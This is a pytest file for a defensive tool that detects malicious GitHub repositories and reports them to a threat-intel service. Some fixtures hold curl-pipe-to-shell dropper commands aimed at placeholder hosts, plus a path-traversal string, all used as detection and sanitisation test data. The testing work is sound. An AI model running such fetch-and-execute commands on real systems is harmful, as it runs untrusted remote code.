"""Safety tests for unattended OSM submission."""

from __future__ import annotations

import json
from types import SimpleNamespace

import pytest

from git_warden import osm_automation as auto


class _Response:
    def __init__(self, status_code: int, payload=None, headers=None):
        self.status_code = status_code
        self.headers = headers or {}
        self._payload = payload if payload is not None else {}
        self.content = b"{}"

    def json(self):
        return self._payload


def test_full_history_precheck_backs_off_on_rate_limit(monkeypatch):
    monkeypatch.setattr(auto.config, "OSM_API_KEY", "osm_test")
    replies = [_Response(429, headers={"Retry-After": "7"}), _Response(429),
               _Response(200, {"malicious": False})]
    monkeypatch.setattr(auto.requests, "get", lambda *a, **k: replies.pop(0))
    waits: list[float] = []
    assert auto._search_full_history("https://github.com/evil/dropper",
                                     sleep=waits.append) == []
    assert waits == [7.0, 10.0]


def test_full_history_precheck_fails_closed_when_rate_limit_persists(monkeypatch):
    monkeypatch.setattr(auto.config, "OSM_API_KEY", "osm_test")
    monkeypatch.setattr(auto.requests, "get", lambda *a, **k: _Response(429))
    waits: list[float] = []
    with pytest.raises(auto.OSMPrecheckError, match="429"):
        auto._search_full_history("https://github.com/evil/dropper", sleep=waits.append)
    assert len(waits) == auto.RATE_LIMIT_RETRIES


def test_resource_key_normalizes_repo_variants():
    assert auto._resource_key("https://github.com/Owner/Repo/") == "owner/repo"
    assert auto._resource_key("github.com/owner/repo?x=1") == "owner/repo"


def test_full_history_precheck_fails_closed_on_http_error(monkeypatch):
    monkeypatch.setattr(auto.config, "OSM_API_KEY", "osm_test")
    monkeypatch.setattr(
        auto.requests,
        "get",
        lambda *a, **k: _Response(503),
    )
    with pytest.raises(auto.OSMPrecheckError):
        auto._search_full_history("https://github.com/evil/dropper")


def test_check_malicious_contract_uses_current_endpoint_and_bearer_only(monkeypatch):
    calls = {}
    monkeypatch.setattr(auto.config, "OSM_API_KEY", "osm_test")

    def fake_get(url, **kwargs):
        calls.update(url=url, **kwargs)
        return _Response(
            200,
            {
                "malicious": False,
                "report_type": "repository",
                "resource_identifier": "https://github.com/torvalds/linux",
                "message": "No malicious reports found",
            },
        )

    monkeypatch.setattr(auto.requests, "get", fake_get)
    assert auto._search_full_history("https://github.com/torvalds/linux") == []
    assert calls["url"].endswith("/check-malicious")
    assert calls["params"] == {
        "report_type": "repository",
        "resource_identifier": "https://github.com/torvalds/linux",
    }
    assert calls["headers"]["Authorization"] == "Bearer osm_test"
    assert "apikey" not in calls["headers"]


def test_check_malicious_positive_response_normalizes_details(monkeypatch):
    monkeypatch.setattr(auto.config, "OSM_API_KEY", "osm_test")
    monkeypatch.setattr(
        auto.requests,
        "get",
        lambda *a, **k: _Response(
            200,
            {
                "malicious": True,
                "report_type": "repository",
                "resource_identifier": "https://github.com/evil/dropper",
                "details": {"id": "t1", "status": "verified"},
            },
        ),
    )
    rows = auto._search_full_history("https://github.com/evil/dropper")
    assert rows == [{
        "id": "t1",
        "status": "verified",
        "resource_identifier": "https://github.com/evil/dropper",
        "report_type": "repository",
    }]


def test_rejected_api_key_names_the_secret_to_rotate(monkeypatch):
    monkeypatch.setattr(auto.config, "OSM_API_KEY", "osm_expired")
    monkeypatch.setattr(auto.requests, "get", lambda *a, **k: _Response(401))
    with pytest.raises(auto.OSMPrecheckError, match="verify OSM_KEY"):
        auto._search_full_history("https://github.com/evil/dropper")


def test_existing_repo_checks_only_url_form_identifiers(monkeypatch):
    calls = []

    def fake_search(term):
        calls.append(term)
        return (
            [{"resource_identifier": "https://github.com/Evil/Dropper/", "id": "t1"}]
            if term.endswith("evil/dropper/")
            else []
        )

    monkeypatch.setattr(auto, "_search_full_history", fake_search)
    hit = auto._existing_repo("evil/dropper")
    assert hit and hit["id"] == "t1"
    assert calls == [
        "https://github.com/evil/dropper",
        "https://github.com/evil/dropper/",
    ]

def test_versioned_policy_keeps_all_fail_closed_guards():
    policy = auto.load_policy()
    assert policy["fail_closed"] is True
    assert policy["required_confidence"] in ("auto", "review")
    assert policy["require_docker_sandbox"] is True
    assert policy["require_positive_liveness"] is True
    assert policy["osm_full_history_prechecks"] >= 2
    assert policy["require_shared_intel_dedup"] is True
    assert policy["submit_domains"] is False
    assert policy["pace_seconds"] >= 6


def test_policy_admits_only_known_confidence_tiers():
    policy = auto.load_policy().copy()
    for weak in ("none", "low", "", None):
        policy["required_confidence"] = weak
        with pytest.raises(RuntimeError):
            auto._validate_policy(policy)
    assert auto.accepted_confidence({"required_confidence": "auto"}) == ("auto",)
    assert auto.accepted_confidence({"required_confidence": "review"}) == ("auto", "review")


def _tier2(confidence, confirmed=True):
    return SimpleNamespace(confirmed=confirmed, confidence=confidence, commit_sha="abc",
                           confirming_findings=[{"rule": "r"}], package_spread=[],
                           scanners={})


@pytest.mark.parametrize("accepted,confidence,ok", [
    (("auto",), "auto", True),
    (("auto",), "review", False),
    (("auto", "review"), "review", True),
    (("auto", "review"), "none", False),
])
def test_deep_validate_admits_only_policy_tiers(monkeypatch, accepted, confidence, ok):
    from git_warden.scanning import sandbox_runner
    monkeypatch.setattr(sandbox_runner, "docker_available", lambda: True)
    monkeypatch.setattr(sandbox_runner, "scan_candidate_sandboxed",
                        lambda name: _tier2(confidence))
    valid, reason, _ = auto._deep_validate("evil/dropper", accepted)
    assert valid is ok
    if ok:
        assert confidence.upper() in reason


def test_policy_rejects_weakened_precheck_count():
    policy = auto.load_policy().copy()
    policy["osm_full_history_prechecks"] = 1
    with pytest.raises(RuntimeError):
        auto._validate_policy(policy)


def test_policy_rejects_unattended_domain_submission():
    policy = auto.load_policy().copy()
    policy["submit_domains"] = True
    with pytest.raises(RuntimeError):
        auto._validate_policy(policy)

def test_policy_rejects_disabled_shared_intel_dedup():
    policy = auto.load_policy().copy()
    policy["require_shared_intel_dedup"] = False
    with pytest.raises(RuntimeError):
        auto._validate_policy(policy)


@pytest.fixture
def db(tmp_path, monkeypatch):
    from git_warden.db import Database
    from git_warden.scanning import sandbox_runner

    database = Database.open(tmp_path / "warden.sqlite")
    with database.transaction() as c:
        c.execute("INSERT INTO repo_findings (full_name, detection_method) "
                  "VALUES ('seed/finding', 'code_search')")
    database.dprk_infra_hosts = lambda exclude=None: set()
    monkeypatch.setattr(sandbox_runner, "docker_available", lambda: True)
    monkeypatch.setattr(auto, "load_policy", lambda: _POLICY)
    monkeypatch.setattr(auto.bus, "submitted_targets", lambda: set())
    monkeypatch.setattr(auto.bus, "mark_submitted", lambda *a, **k: None)
    monkeypatch.setattr(auto.time, "sleep", lambda s: None)
    yield database
    database.close()


_POLICY = auto.load_policy()


def test_second_osm_precheck_closes_race_before_post(monkeypatch, db):
    row = {"full_name": "evil/dropper"}
    checks = iter([None, {"id": "race", "status": "pending"}])

    monkeypatch.setattr(auto, "gold_for_submission", lambda db, limit=0, **_kw: [row])
    monkeypatch.setattr(auto, "_existing_repo", lambda name: next(checks))
    monkeypatch.setattr(auto, "_deep_validate", lambda name, *_a: (True, "AUTO", None))
    monkeypatch.setattr(auto, "repo_payload_live", lambda finding: True)
    monkeypatch.setattr(auto, "submit_threat", lambda report: pytest.fail("must not POST"))

    assert auto.run(db, limit=1) == (0, 0)


# --- "Validated malicious repo" markdown summary ------------------------------


class _Finding:
    def __init__(self, file, line, snippet):
        self.file, self.line, self.snippet = file, line, snippet
        self.category, self.rule = "delivery", "curl_pipe_sh"


class _Tier2:
    commit_sha = "0123abcd"
    scanners = {"guarddog": "flagged", "semgrep": "clean"}

    def __init__(self, findings):
        self.confirming_findings = findings


def _validated_run(monkeypatch, tmp_path, db, *, dry_run, submit=None):
    row = {"full_name": "evil/dropper", "score": 91, "detection_method": "code_search"}
    finding = _Finding("install.sh", 7, "curl -s http://c2.example/x | sh\n```\n# [x](http://a)")
    report = {"severity_level": "critical", "tags": ["dropper", "dprk"],
              "verified_iocs": "c2.example", "threat_description": "Drops a payload."}
    marks = []
    monkeypatch.setattr(auto, "gold_for_submission", lambda db, limit=0, **_kw: [row])
    monkeypatch.setattr(auto.bus, "mark_submitted", lambda *a, **k: marks.append(("bus", a)))
    monkeypatch.setattr(auto, "_existing_repo", lambda name: None)
    monkeypatch.setattr(auto, "_deep_validate",
                        lambda name, *_a: (True, "AUTO", _Tier2([finding])))
    monkeypatch.setattr(auto, "repo_payload_live", lambda finding: True)
    monkeypatch.setattr(auto, "build_report", lambda row, **k: report)
    monkeypatch.setattr(auto, "campaign_context", lambda db, row: "")
    monkeypatch.setattr(auto, "mark_osm_submitted",
                        lambda db, name, tid: marks.append(("claim", name, tid)))
    monkeypatch.setattr(auto, "unmark_osm_submitted",
                        lambda db, name: marks.append(("unclaim", name)))
    monkeypatch.setattr(
        auto, "submit_threat",
        submit or (lambda report: pytest.fail("validate-only run must not POST")))
    out = tmp_path / "summary.md"
    result = auto.run(db, limit=1, dry_run=dry_run, summary_path=out)
    return result, out.read_text(encoding="utf-8"), marks


def test_dry_run_reports_validated_repo_not_yet_in_osm(monkeypatch, tmp_path, db):
    (sent, errors), md, marks = _validated_run(monkeypatch, tmp_path, db, dry_run=True)
    assert (sent, errors) == (0, 0)
    assert marks == []  # no claim, no shared-intel mark, no POST
    assert "### Validated malicious repo: `evil/dropper`" in md
    assert "NOT YET REPORTED TO OSM" in md
    assert "https://github.com/evil/dropper" in md
    assert "https://github.com/evil/dropper/blob/0123abcd/install.sh#L7" in md
    assert "| Severity | critical |" in md
    assert "guarddog" in md
    assert "validate-only" in md


def test_submit_run_records_threat_id_in_summary(monkeypatch, tmp_path, db):
    (sent, errors), md, marks = _validated_run(
        monkeypatch, tmp_path, db, dry_run=False,
        submit=lambda report: {"threat_id": "t-42"})
    assert (sent, errors) == (1, 0)
    assert ("claim", "evil/dropper", "t-42") in marks
    assert "submitted** as `t-42`" in md
    assert "NOT YET REPORTED" not in md


def test_failed_post_is_counted_and_does_not_abort_run(monkeypatch, tmp_path, db):
    def boom(report):
        raise RuntimeError("HTTP 500")

    (sent, errors), md, marks = _validated_run(
        monkeypatch, tmp_path, db, dry_run=False, submit=boom)
    assert (sent, errors) == (0, 1)
    assert ("unclaim", "evil/dropper") in marks
    assert "NOT REPORTED TO OSM" in md and "POST failed" in md


def test_summary_groups_validated_repos_into_their_campaign(monkeypatch, tmp_path, db):
    def task(host):
        return json.dumps({"bash_findings": [{
            "file": ".vscode/tasks.json", "line": 0, "category": "install_hook",
            "rule": "vscode-autorun",
            "snippet": f"curl 'https://{host}/settings/linux?flag=606' | bash"}]})

    with db.transaction() as c:
        for name, host in (("ta3pks/social", "one.vercel.app"),
                           ("lfirsl/morphix", "two.vercel.app"),
                           ("older/member", "three.vercel.app")):
            c.execute("INSERT INTO repo_findings (full_name, detection_method, status, "
                      "raw_payload) VALUES (?, 'signature_match', 'confirmed', ?)",
                      (name, task(host)))
    rows = [{"full_name": n, "score": 90, "detection_method": "signature_match"}
            for n in ("ta3pks/social", "lfirsl/morphix")]
    monkeypatch.setattr(auto, "gold_for_submission", lambda db, limit=0, **_kw: rows)
    monkeypatch.setattr(auto, "_existing_repo", lambda name: None)
    monkeypatch.setattr(auto, "_deep_validate", lambda name, *_a: (True, "AUTO", _Tier2([])))
    monkeypatch.setattr(auto, "repo_payload_live", lambda finding: True)
    monkeypatch.setattr(auto, "build_report", lambda row, **k: {})
    monkeypatch.setattr(auto, "campaign_context", lambda db, row: "")
    out = tmp_path / "summary.md"
    auto.run(db, limit=5, dry_run=True, summary_path=out)
    md = out.read_text(encoding="utf-8")

    from git_warden.correlate import campaign_id
    cid = campaign_id("dropper:vscode-folderopen:settings/{os}?flag=")
    assert "### Campaign correlation" in md
    assert (f"| `{cid}` | `vscode-folderopen:settings/{{os}}?flag=` (dropper) "
            "| 2 | 3 | 3 | 3 | none |") in md
    assert "Other confirmed members: `older/member`" in md
    assert md.count(f"| Campaign | `{cid}`: one of 3 confirmed repos") == 2
    # The campaign block comes before the per-repo sections.
    assert md.index("### Campaign correlation") < md.index("### Validated malicious repo")


def test_untrusted_snippet_cannot_escape_its_code_fence():
    fenced = auto._fence("a\n```\n[click](http://evil)\n````")
    assert fenced.startswith("`````text\n") and fenced.endswith("\n`````")


def test_skipped_candidates_are_listed_in_summary(monkeypatch, tmp_path, db):
    monkeypatch.setattr(auto, "gold_for_submission",
                        lambda db, limit=0, **_kw: [{"full_name": "gone/repo"}])
    monkeypatch.setattr(auto, "_existing_repo", lambda name: None)
    monkeypatch.setattr(auto, "_deep_validate",
                        lambda name, *_a: (False, "sandbox scan produced no result", None))
    out = tmp_path / "summary.md"
    auto.run(db, limit=1, dry_run=True, summary_path=out)
    md = out.read_text(encoding="utf-8")
    assert "Validated malicious repos: **0**" in md
    assert ("| `gone/repo` | deep validation failed closed: "
            "sandbox scan produced no result |") in md


# --- Unattended-run hardening -----------------------------------------------


def test_cli_overrides_can_only_tighten_policy():
    cap, pace = _POLICY["max_submissions_per_run"], _POLICY["pace_seconds"]
    assert auto._effective_limits(_POLICY, 0, 0) == (1, pace)      # 0 is NOT unlimited
    assert auto._effective_limits(_POLICY, 500, None) == (cap, pace)
    assert auto._effective_limits(_POLICY, 3, 60) == (3, 60)


def test_failed_candidates_cool_down_instead_of_starving_queue(monkeypatch, db):
    rows = [{"full_name": "a/stale"}, {"full_name": "b/fresh"}]
    scanned = []
    monkeypatch.setattr(auto, "gold_for_submission", lambda db, limit=0, **_kw: rows)
    monkeypatch.setattr(auto, "_existing_repo", lambda name: None)
    monkeypatch.setattr(
        auto, "_deep_validate",
        lambda name, *_a: (scanned.append(name),
                      (False, "scan no longer confirms", _Tier2([])))[1])

    auto.run(db, limit=1, dry_run=True, now=1_000_000)
    auto.run(db, limit=1, dry_run=True, now=1_000_000 + 3600)
    assert scanned == ["a/stale", "b/fresh"]  # 2nd run moves past the failure
    auto.run(db, limit=1, dry_run=True, now=1_000_000 + auto.RETRY_AFTER_SECONDS + 1)
    assert scanned[-1] == "a/stale"  # retried once the cooldown expires


def test_transient_failures_retry_sooner(monkeypatch, db):
    monkeypatch.setattr(auto, "gold_for_submission",
                        lambda db, limit=0, **_kw: [{"full_name": "flaky/repo"}])
    monkeypatch.setattr(auto, "_existing_repo", lambda name: None)
    scanned = []
    monkeypatch.setattr(
        auto, "_deep_validate",
        lambda name, *_a: (scanned.append(name), (False, "sandbox scan produced no result",
                                             None))[1])
    t0 = 2_000_000
    auto.run(db, dry_run=True, now=t0)
    auto.run(db, dry_run=True, now=t0 + auto.TRANSIENT_RETRY_SECONDS - 1)
    auto.run(db, dry_run=True, now=t0 + auto.TRANSIENT_RETRY_SECONDS + 1)
    assert scanned == ["flaky/repo", "flaky/repo"]


def test_cheap_skips_do_not_consume_scan_limit(monkeypatch, db, tmp_path):
    rows = [{"full_name": f"known/r{i}"} for i in range(5)] + [{"full_name": "new/repo"}]
    monkeypatch.setattr(auto, "gold_for_submission", lambda db, limit=0, **_kw: rows)
    monkeypatch.setattr(auto, "_existing_repo",
                        lambda name: {"id": "x", "status": "verified"}
                        if name.startswith("known/") else None)
    scanned = []
    monkeypatch.setattr(
        auto, "_deep_validate",
        lambda name, *_a: (scanned.append(name), (False, "n/a", None))[1])
    auto.run(db, limit=1, dry_run=True)
    assert scanned == ["new/repo"]


def test_shared_intel_dedup_matches_any_spelling(monkeypatch):
    monkeypatch.setattr(auto.bus, "submitted_targets",
                        lambda: {"repository:github.com/Evil/Dropper/"})
    assert auto._bus_submitted("evil/dropper")
    assert not auto._bus_submitted("evil/other")


def test_empty_hunt_data_blocks_run_loudly(tmp_path, monkeypatch):
    from git_warden.db import Database

    empty = Database.open(tmp_path / "empty.sqlite")
    monkeypatch.setattr(auto, "load_policy", lambda: _POLICY)
    out = tmp_path / "summary.md"
    with pytest.raises(auto.AutomationBlocked):
        auto.run(empty, dry_run=True, summary_path=out)
    empty.close()
    assert "Run blocked:** no hunt data" in out.read_text(encoding="utf-8")


def test_missing_sandbox_blocks_run_loudly(monkeypatch, db):
    from git_warden.scanning import sandbox_runner

    monkeypatch.setattr(auto, "gold_for_submission",
                        lambda db, limit=0, **_kw: [{"full_name": "evil/dropper"}])
    monkeypatch.setattr(sandbox_runner, "docker_available", lambda: False)
    with pytest.raises(auto.AutomationBlocked):
        auto.run(db, dry_run=True)


def test_cli_missing_database_exits_nonzero_with_summary(tmp_path):
    out = tmp_path / "summary.md"
    code = auto.main(["--dry-run", "--db", str(tmp_path / "nope" / "w.sqlite"),
                      "--summary-md", str(out)])
    assert code == 2
    assert "Run blocked:** no hunt data" in out.read_text(encoding="utf-8")
    assert not (tmp_path / "nope").exists()  # never creates an empty DB


def test_run_lock_rejects_overlapping_run(tmp_path):
    pytest.importorskip("fcntl")
    first = auto._acquire_run_lock(tmp_path / "osm.lock")
    try:
        assert first is not None
        assert auto._acquire_run_lock(tmp_path / "osm.lock") is None
    finally:
        first.close()


# --- Approval flow: validate job -> reviewer approves -> submit job -------------


def test_only_restricts_run_to_approved_repos(monkeypatch, db):
    rows = [{"full_name": "evil/approved"}, {"full_name": "evil/newer"}]
    scanned, validated = [], []
    monkeypatch.setattr(auto, "gold_for_submission", lambda db, limit=0, **_kw: rows)
    monkeypatch.setattr(auto, "_existing_repo", lambda name: None)
    monkeypatch.setattr(
        auto, "_deep_validate",
        lambda name, *_a: (scanned.append(name), (False, "n/a", None))[1])
    auto.run(db, dry_run=True, only={"evil/approved"}, validated_out=validated)
    assert scanned == ["evil/approved"]  # a newer, unapproved candidate is never touched


def test_validated_out_lists_repos_that_passed(monkeypatch, tmp_path, db):
    validated = []
    monkeypatch.setattr(auto, "gold_for_submission",
                        lambda db, limit=0, **_kw: [{"full_name": "evil/dropper", "score": 9,
                                              "detection_method": "signature_match"}])
    monkeypatch.setattr(auto, "_existing_repo", lambda name: None)
    monkeypatch.setattr(auto, "_deep_validate", lambda name, *_a: (True, "AUTO", _Tier2([])))
    monkeypatch.setattr(auto, "repo_payload_live", lambda row: True)
    monkeypatch.setattr(auto, "build_report", lambda row, **k: {})
    monkeypatch.setattr(auto, "campaign_context", lambda db, row: "")
    auto.run(db, dry_run=True, validated_out=validated)
    assert validated == ["evil/dropper"]


def test_read_only_file_normalizes_and_drops_malformed(tmp_path):
    f = tmp_path / "approved.json"
    f.write_text('["Evil/Dropper/", "a/b", "../../etc/passwd", "no-slash", 7]')
    assert auto._read_only_file(f) == {"evil/dropper", "a/b"}


def test_cli_wires_only_file_and_validated_json(monkeypatch, tmp_path):
    from git_warden.db import Database

    db_path = tmp_path / "w.sqlite"
    Database.open(db_path).close()
    approved = tmp_path / "approved.json"
    approved.write_text('["evil/dropper"]')
    out = tmp_path / "validated.json"
    seen = {}

    def fake_run(db, **kw):
        seen.update(kw)
        kw["validated_out"].append("evil/dropper")
        return 0, 0

    monkeypatch.setattr(auto, "run", fake_run)
    code = auto.main(["--db", str(db_path), "--only-file", str(approved),
                      "--validated-json", str(out)])
    assert code == 0
    assert seen["only"] == {"evil/dropper"} and seen["dry_run"] is False
    assert json.loads(out.read_text()) == ["evil/dropper"]


def test_cli_empty_approved_list_does_nothing(monkeypatch, tmp_path):
    from git_warden.db import Database

    db_path = tmp_path / "w.sqlite"
    Database.open(db_path).close()
    approved = tmp_path / "approved.json"
    approved.write_text("[]")
    monkeypatch.setattr(auto, "run", lambda *a, **k: pytest.fail("must not run"))
    assert auto.main(["--db", str(db_path), "--only-file", str(approved)]) == 0


def test_known_good_owner_is_never_submitted(monkeypatch, db):
    rows = [{"full_name": "redwoodresearch/basharena_public"}]
    monkeypatch.setattr(auto, "gold_for_submission", lambda db, limit=0, **_kw: rows)
    monkeypatch.setattr(auto, "_existing_repo",
                        lambda name: pytest.fail("known-good owner must not reach OSM"))
    monkeypatch.setattr(auto, "submit_threat", lambda report: pytest.fail("must not POST"))
    validated = []
    auto.run(db, only={"redwoodresearch/basharena_public"}, validated_out=validated)
    assert validated == []


def test_run_selects_and_revalidates_at_the_policy_tiers(monkeypatch, db):
    seen = {}

    def gold(db, limit=0, **kw):
        seen["min_confidence"] = kw.get("min_confidence")
        return [{"full_name": "evil/dropper"}]

    def validate(name, accepted=("auto",)):
        seen["accepted"] = accepted
        return False, "stop here", None

    monkeypatch.setattr(auto, "load_policy",
                        lambda: {**_POLICY, "required_confidence": "review"})
    monkeypatch.setattr(auto, "gold_for_submission", gold)
    monkeypatch.setattr(auto, "_existing_repo", lambda name: None)
    monkeypatch.setattr(auto, "_deep_validate", validate)
    monkeypatch.setattr(auto, "submit_threat", lambda report: pytest.fail("must not POST"))
    auto.run(db, limit=1)
    assert seen == {"min_confidence": "review", "accepted": ("auto", "review")}
